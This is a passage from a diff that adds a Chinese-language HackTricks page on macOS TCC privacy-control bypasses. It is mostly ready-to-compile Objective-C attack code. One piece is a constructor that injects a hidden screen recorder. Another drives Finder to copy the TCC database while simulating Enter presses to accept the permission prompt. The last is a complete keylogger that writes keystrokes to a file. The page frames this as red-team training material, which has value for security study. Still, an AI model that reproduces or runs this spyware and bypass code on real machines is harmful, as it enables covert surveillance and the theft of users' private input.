+fromConnections:(NSArray *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording error: %@", error);
+} else {
+NSLog(@"Recording finished successfully.");
+}
+exit(0);
+}
+
+@end
+
+__attribute__((constructor))
+void myconstructor(int argc, const char **argv)
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
+AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
+if ([captureSession canAddInput:screenInput]) {
+[captureSession addInput:screenInput];
+}
+
+AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
+if ([captureSession canAddOutput:fileOutput]) {
+[captureSession addOutput:fileOutput];
+}
+
+[captureSession startRunning];
+
+MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
+[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
+
+// Run the loop for 5 seconds to capture
+dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+[fileOutput stopRecording];
+});
+
+CFRunLoopRun();
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Shell" %}
+录制主屏幕5秒钟</p>
+<pre><code class="language-bash">screencapture -V 5 /tmp/screen.mov
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h3 id="可访问性"><a class="header" href="#可访问性">可访问性</a></h3>
+<ul>
+<li><strong>权限</strong>: 无</li>
+<li><strong>TCC</strong>: <code>kTCCServiceAccessibility</code></li>
+</ul>
+<p>使用 TCC 权限接受 Finder 的控制，按下回车并以此绕过 TCC</p>
+<p>{% tabs %}
+{% tab title="接受 TCC" %}</p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;ApplicationServices/ApplicationServices.h&gt;
+#import &lt;OSAKit/OSAKit.h&gt;
+
+// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
+// TODO: Improve to monitor the foreground app and press enter when TCC appears
+
+void SimulateKeyPress(CGKeyCode keyCode) {
+CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
+CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
+CGEventPost(kCGHIDEventTap, keyDownEvent);
+CGEventPost(kCGHIDEventTap, keyUpEvent);
+if (keyDownEvent) CFRelease(keyDownEvent);
+if (keyUpEvent) CFRelease(keyUpEvent);
+}
+
+void RunAppleScript() {
+NSLog(@"Starting AppleScript");
+NSString *scriptSource = @"tell application \"Finder\"\n"
+"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
+"set targetFolder to POSIX file \"/tmp\" as alias\n"
+"duplicate file sourceFile to targetFolder with replacing\n"
+"end tell\n";
+
+NSDictionary *errorDict = nil;
+NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
+[appleScript executeAndReturnError:&amp;errorDict];
+
+if (errorDict) {
+NSLog(@"AppleScript Error: %@", errorDict);
+}
+}
+
+int main() {
+@autoreleasepool {
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+RunAppleScript();
+});
+
+// Simulate pressing the Enter key every 0.1 seconds
+NSLog(@"Starting key presses");
+for (int i = 0; i &lt; 10; ++i) {
+SimulateKeyPress((CGKeyCode)36); // Key code for Enter
+usleep(100000); // 0.1 seconds
+}
+}
+return 0;
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Keylogger" %}
+将按下的键存储在 <strong><code>/tmp/keystrokes.txt</code></strong></p>
+<pre><code class="language-objectivec">#import &lt;Foundation/Foundation.h&gt;
+#import &lt;ApplicationServices/ApplicationServices.h&gt;
+#import &lt;Carbon/Carbon.h&gt;
+
+// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m
+
+NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";
+
+void AppendStringToFile(NSString *str, NSString *filePath) {
+NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
+if (fileHandle) {
+[fileHandle seekToEndOfFile];
+[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
+[fileHandle closeFile];
+} else {
+// If the file does not exist, create it
+[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+}
+}
+
+CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+if (type == kCGEventKeyDown) {
+CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+
+NSString *keyString = nil;
+// First, handle special non-printable keys
+switch (keyCode) {
+case kVK_Return: keyString = @"&lt;Return&gt;"; break;
+case kVK_Tab: keyString = @"&lt;Tab&gt;"; break;
+case kVK_Space: keyString = @"&lt;Space&gt;"; break;
+case kVK_Delete: keyString = @"&lt;Delete&gt;"; break;
+case kVK_Escape: keyString = @"&lt;Escape&gt;"; break;
+case kVK_Command: keyString = @"&lt;Command&gt;"; break;
+case kVK_Shift: keyString = @"&lt;Shift&gt;"; break;
+case kVK_CapsLock: keyString = @"&lt;CapsLock&gt;"; break;
+case kVK_Option: keyString = @"&lt;Option&gt;"; break;
+case kVK_Control: keyString = @"&lt;Control&gt;"; break;
+case kVK_RightControl: keyString = @"&lt;Control&gt;"; break;
+case kVK_RightShift: keyString = @"&lt;Shift&gt;"; break;
+case kVK_RightOption: keyString = @"&lt;Option&gt;"; break;
+case kVK_Function: keyString = @"&lt;Function&gt;"; break;
+case kVK_F1: keyString = @"&lt;F1&gt;"; break;
+case kVK_F2: keyString = @"&lt;F2&gt;"; break;
+case kVK_F3: keyString = @"&lt;F3&gt;"; break;
+// Add more cases here for other non-printable keys...
+default: break; // Not a special non-printable key
+}
+
+// If it's not a special key, try to translate it
+if (!keyString) {
+UniCharCount maxStringLength = 4;
+UniCharCount actualStringLength = 0;
+UniChar unicodeString[maxStringLength];
+
+TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
+CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
+const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
+
+UInt32 deadKeyState = 0;
+OSStatus status = UCKeyTranslate(keyboardLayout,
+keyCode,
+kUCKeyActionDown,
+0,
+LMGetKbdType(),
+kUCKeyTranslateNoDeadKeysBit,
+&amp;deadKeyState,
+maxStringLength,
+&amp;actualStringLength,
+unicodeString);
+CFRelease(currentKeyboard);
+
+if (status == noErr &amp;&amp; actualStringLength &gt; 0) {
+keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
+} else {
+keyString = [NSString stringWithFormat:@"&lt;KeyCode: %d&gt;", keyCode];
+}
+}
+
+NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
+AppendStringToFile(logString, kKeystrokesLogPath);
+}
+return event;
+}
+
+int main() {
+@autoreleasepool {
+CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
+CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);
+
+if (!eventTap) {
+NSLog(@"Failed to create event tap");
+exit(1);
+}
+
+CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
+CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+CGEventTapEnable(eventTap, true);
+CFRunLoopRun();
+}
+return 0;
+}
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<p>{% hint style="danger" %}
+<strong>无障碍功能是一个非常强大的权限</strong>，你可以以其他方式滥用它，例如你可以仅通过它执行<strong>击键攻击</strong>，而无需调用系统事件。
+{% endhint %}</p>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/macos-apple-scripts.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-dangerous-entitlements.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/macos-apple-scripts.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-dangerous-entitlements.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
